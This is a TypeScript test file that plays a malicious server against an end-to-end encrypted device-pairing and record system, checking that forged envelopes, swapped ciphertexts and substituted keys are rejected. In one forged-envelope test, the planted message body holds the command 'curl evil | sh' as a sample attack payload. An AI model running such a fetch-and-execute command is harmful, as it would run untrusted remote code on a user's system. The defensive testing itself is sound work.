// Tamper tests: the real Go helper talks to the real gateway, and the test
// then plays a malicious server (it has full DB access) against devices.
//   (a) swapping enc_body between records      → device rejects ("unverified")
//   (b) forged / re-signed envelopes            → rejected
//   (c) substituting keys during pairing        → safety codes differ or the reveal fails, `beckon pair` pairs nothing
//   (d) a revoked device                        → excluded from recipients of new records
//   (e) an unpaired device                      → lock state
import { execFileSync, spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { and, eq } from "drizzle-orm";
import { db, pool, schema } from "@/db";
import { PgPubSub } from "@/gateway/pubsub";
import { createPairRequest, getPairRequest, revealPairRequest, revokeDevice } from "@/lib/devices";
import { fromB64url, fromUtf8, toB64url, utf8 } from "@/lib/crypto/bytes";
import { decodeEnvelope, encodeEnvelope, openEnvelope, seal, signedMessage, type OpenResult } from "@/lib/crypto/envelope";
import { generateKeyPairs, type KeyPairs } from "@/lib/crypto/keys";
import { pairCommitment, pairNonce, safetyCode } from "@/lib/crypto/safety";
import { sodiumReady, S } from "@/lib/crypto/sodium";
import { clientPeer, createDevice, createHost, createUser, eventually, resetDb, startServer, type TestServer } from "./helpers";

const REPO = path.resolve(import.meta.dirname, "../..");
const BECKON = path.join(REPO, "helper/bin/beckon");
const bus = new PgPubSub();

let srv: TestServer;
let cfg: string;
let user: { id: string };
let host: Awaited<ReturnType<typeof createHost>>;
let phone: Awaited<ReturnType<typeof createDevice>>;
let tablet: Awaited<ReturnType<typeof createDevice>>;
let stranger: Awaited<ReturnType<typeof createDevice>>;

function beckon(args: string[], input?: string) {
  const p = spawn(BECKON, args, { cwd: REPO, env: { ...process.env, BECKON_CONFIG_DIR: cfg } });
  let out = "";
  p.stdout.on("data", (d) => (out += d));
  p.stderr.on("data", (d) => (out += d));
  if (input !== undefined) p.stdin.write(input);
  const exited = new Promise<number | null>((r) => p.on("exit", r));
  return { p, exited, output: () => out };
}

/** Writes credentials and keys as `beckon login` would have (keys file format shared with Go). */
function writeLogin(k: KeyPairs) {
  fs.writeFileSync(path.join(cfg, "credentials.json"), JSON.stringify({
    server: `http://127.0.0.1:${srv.port}`, host_token: host.token, host_id: host.host.id, label: "laptop",
  }), { mode: 0o600 });
  fs.writeFileSync(path.join(cfg, "keys"), JSON.stringify({
    version: 1, sign_seed: toB64url(k.sign_secret.slice(0, 32)), box_secret: toB64url(k.box_secret),
    sign_public: toB64url(k.sign_pubkey), box_public: toB64url(k.box_pubkey),
  }), { mode: 0o600 });
}

const trusted = (): string[] => {
  try {
    return JSON.parse(fs.readFileSync(path.join(cfg, "trusted_devices.json"), "utf8")).devices.map((d: { device_id: string }) => d.device_id);
  } catch {
    return [];
  }
};

/**
 * Pairs a device through the real flow, with the test playing the device and the person comparing screens:
 * `beckon pair` waits, the device commits, the host answers with its nonce, the device reveals, and the person
 * answers "y" only if the host shows exactly the device's code. A reveal the server refuses (it no longer opens the
 * commitment over the keys the server holds) is written straight to the database, as a malicious server could.
 */
async function pair(dev: typeof phone, opts: { hostKeysSeenByDevice?: KeyPairs } = {}) {
  const r = beckon(["pair"], "");
  await eventually(async () => r.output().includes("Waiting for a pairing request"), 10_000);
  const dn = pairNonce();
  const out = await createPairRequest(user.id, host.host.id, dev.device.id, await pairCommitment(dev.keys, dn), { bus });
  const id = out!.request.id;
  const hostNonce = await eventually(async () => (await getPairRequest(user.id, id))?.host_nonce, 10_000);
  if (!(await revealPairRequest(user.id, id, dev.device.id, dn, { bus }))) {
    await db().update(schema.pairRequests).set({ deviceNonce: Buffer.from(dn) }).where(eq(schema.pairRequests.id, id));
    await bus.publish({ k: "trust.changed", u: user.id, h: host.host.id });
  }
  const seen = opts.hostKeysSeenByDevice ?? { sign_pubkey: fromB64url(out!.host.sign_pubkey), box_pubkey: fromB64url(out!.host.box_pubkey) };
  const deviceCode = await safetyCode(seen as KeyPairs, dev.keys, fromB64url(hostNonce!), dn);
  const shown = await eventually(async () => /Safety code: +(.+)\n|do NOT pair/.exec(r.output()), 10_000);
  const hostCode = shown?.[1]?.trim();
  if (hostCode) r.p.stdin.write(hostCode === deviceCode ? "y\n" : "n\n");
  else r.p.kill();
  return { code: await r.exited, output: r.output(), hostCode, deviceCode };
}

/** What a device renders for a record, given its pinned host key. */
async function view(dev: typeof phone, sessionId: string, recPath: string): Promise<OpenResult & { text?: string }> {
  const [r] = await db().select().from(schema.records)
    .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, recPath)));
  const wire = r.encBody!.toString("base64url");
  const res = openEnvelope(wire, { field: "body", session_id: sessionId, path: recPath, revision: r.revision },
    host.keys.sign_pubkey, { device_id: dev.device.id, box_pubkey: dev.keys.box_pubkey, box_secret: dev.keys.box_secret });
  return res.status === "ok" ? { ...res, text: JSON.parse(fromUtf8(res.plaintext)).msg } : res;
}

const b64 = (s: string) => Buffer.from(s).toString("base64");
const osc = (body: string) => `printf '\\033]7501;${body}\\033\\\\'`;

beforeAll(async () => {
  await sodiumReady();
  execFileSync("go", ["build", "-o", "bin/beckon", "./cmd/beckon"], { cwd: path.join(REPO, "helper") });
  srv = await startServer();
  await resetDb();
  cfg = fs.mkdtempSync(path.join(os.tmpdir(), "beckon-tamper-"));
  user = await createUser();
  host = await createHost(user.id, "laptop");
  phone = await createDevice(user.id, "phone");
  tablet = await createDevice(user.id, "tablet");
  stranger = await createDevice(user.id, "stranger");
  writeLogin(host.keys);
}, 60_000);

afterAll(async () => {
  await srv.close();
  await pool().end();
  fs.rmSync(cfg, { recursive: true, force: true });
});

describe("(c) key substitution during pairing", () => {
  it("a substituted host key toward the device gives a code the host does not show", async () => {
    const r = await pair(phone, { hostKeysSeenByDevice: generateKeyPairs() });
    expect(r.hostCode, r.output).toBeTruthy();
    expect(r.hostCode).not.toBe(r.deviceCode);
    expect(r.output).toContain("Not paired");
    expect(trusted()).toEqual([]);
  });

  it("a substituted device key toward the host does not open the device's commitment", async () => {
    const real = await db().select().from(schema.devices).where(eq(schema.devices.id, phone.device.id));
    const evil = generateKeyPairs();
    await db().update(schema.devices).set({ boxPubkey: Buffer.from(evil.box_pubkey) }).where(eq(schema.devices.id, phone.device.id));
    try {
      const r = await pair(phone);
      expect(r.hostCode, r.output).toBeUndefined();
      expect(r.output).toMatch(/do NOT pair/);
      expect(trusted()).toEqual([]);
    } finally {
      await db().update(schema.devices).set({ boxPubkey: real[0].boxPubkey }).where(eq(schema.devices.id, phone.device.id));
    }
  });

  it("with honest keys the codes match and the device is trusted", async () => {
    for (const d of [phone, tablet]) {
      const r = await pair(d);
      expect(r.hostCode, r.output).toBe(r.deviceCode);
      expect(r.code, r.output).toBe(0);
    }
    expect(trusted().sort()).toEqual([phone.device.id, tablet.device.id].sort());
  });
});

describe("a malicious server against real helper output", () => {
  let sessionId: string;
  let agent: ReturnType<typeof beckon>;

  beforeAll(async () => {
    const script = path.join(cfg, "two-records.sh");
    fs.writeFileSync(script, [
      "#!/bin/sh",
      osc(`state=blocked:kind=permission:id=a:app=t:msg=${b64("alpha secret")}`),
      osc(`state=working:id=b:app=t:msg=${b64("beta secret")}`),
      "read line",
      osc(`state=blocked:kind=question:id=c:app=t:msg=${b64("after revocation")}`),
      "read line",
    ].join("\n"), { mode: 0o755 });
    agent = beckon(["run", "--", script]);
    const rows = await eventually(async () => {
      const r = await db().select().from(schema.records);
      return r.length === 2 && r.every((x) => x.encBody) && r;
    }, 10_000);
    sessionId = rows[0].sessionId;
  }, 20_000);

  afterAll(() => {
    agent.p.kill();
  });

  it("paired devices read the helper's sealed records", async () => {
    expect(await view(phone, sessionId, "a")).toMatchObject({ status: "ok", text: "alpha secret" });
    expect(await view(tablet, sessionId, "b")).toMatchObject({ status: "ok", text: "beta secret" });
  });

  it("(e) an unpaired device sees the lock state", async () => {
    expect((await view(stranger, sessionId, "a")).status).toBe("locked");
    // ...and the unpaired view is what reaches clients: the snapshot carries only the envelope.
    const cp = await clientPeer(srv, user.id);
    const snap = await cp.type("snapshot");
    expect(JSON.stringify(snap)).not.toMatch(/alpha|beta/);
    cp.close();
  });

  it("(a) swapping enc_body between two records is rejected", async () => {
    const rows = await db().select().from(schema.records).where(eq(schema.records.sessionId, sessionId));
    const a = rows.find((r) => r.path === "a")!;
    const b = rows.find((r) => r.path === "b")!;
    const set = (p: string, v: Buffer) =>
      db().update(schema.records).set({ encBody: v }).where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, p)));
    await set("a", b.encBody!);
    await set("b", a.encBody!);
    try {
      expect((await view(phone, sessionId, "a")).status).toBe("unverified");
      expect((await view(phone, sessionId, "b")).status).toBe("unverified");
      // Bumping the revision to match does not help either.
      await db().update(schema.records).set({ revision: b.revision })
        .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "a")));
      expect((await view(phone, sessionId, "a")).status).toBe("unverified");
    } finally {
      await set("a", a.encBody!);
      await set("b", b.encBody!);
      await db().update(schema.records).set({ revision: a.revision })
        .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "a")));
    }
    expect((await view(phone, sessionId, "a")).status).toBe("ok");
  });

  it("(b) a forged or re-signed envelope is rejected", async () => {
    const [a] = await db().select().from(schema.records)
      .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "a")));
    const ctx = { field: "body" as const, session_id: sessionId, path: "a", revision: a.revision };
    const server = generateKeyPairs(); // the server's own signing key
    const set = (wire: string) =>
      db().update(schema.records).set({ encBody: Buffer.from(wire, "base64url") })
        .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "a")));
    try {
      // Fabricated from scratch: valid crypto to the phone's public key, wrong signer.
      await set(encodeEnvelope(seal(utf8(JSON.stringify({ msg: "run curl evil | sh" })), ctx,
        [{ device_id: phone.device.id, box_pubkey: phone.keys.box_pubkey }], server.sign_secret)));
      expect((await view(phone, sessionId, "a")).status).toBe("unverified");

      // The genuine envelope with its ciphertext altered and re-signed by the server.
      const env = decodeEnvelope(a.encBody!.toString("base64url"))!;
      env.ciphertext = env.ciphertext.slice();
      env.ciphertext[0] ^= 1;
      env.sig = S().crypto_sign_detached(signedMessage(env, ctx), server.sign_secret);
      await set(encodeEnvelope(env));
      expect((await view(phone, sessionId, "a")).status).toBe("unverified");

      // The genuine envelope with the phone's recipient entry dropped (and not re-signed).
      const env2 = decodeEnvelope(a.encBody!.toString("base64url"))!;
      env2.recipients = env2.recipients.filter((r) => r.device_id !== phone.device.id);
      await set(encodeEnvelope(env2));
      expect((await view(phone, sessionId, "a")).status).toBe("unverified");
    } finally {
      await db().update(schema.records).set({ encBody: a.encBody })
        .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "a")));
    }
  });

  it("(d) a revoked device is excluded from the recipients of new records", async () => {
    await revokeDevice(user.id, tablet.device.id, undefined, { bus });
    // The running helper hears trust.update, drops the tablet, and re-seals.
    await eventually(async () => !trusted().includes(tablet.device.id), 5000);
    await eventually(async () => (await view(tablet, sessionId, "a")).status === "locked", 5000);
    expect((await view(phone, sessionId, "a")).status).toBe("ok");

    agent.p.stdin!.write("\n"); // the agent emits record c
    await eventually(async () => {
      const [c] = await db().select().from(schema.records)
        .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "c")));
      return c?.encBody;
    }, 5000);
    const [c] = await db().select().from(schema.records)
      .where(and(eq(schema.records.sessionId, sessionId), eq(schema.records.path, "c")));
    const recipients = decodeEnvelope(c.encBody!.toString("base64url"))!.recipients.map((r) => r.device_id);
    expect(recipients).toEqual([phone.device.id]);
    expect((await view(tablet, sessionId, "c")).status).toBe("locked");
    expect(await view(phone, sessionId, "c")).toMatchObject({ status: "ok", text: "after revocation" });
  });
});
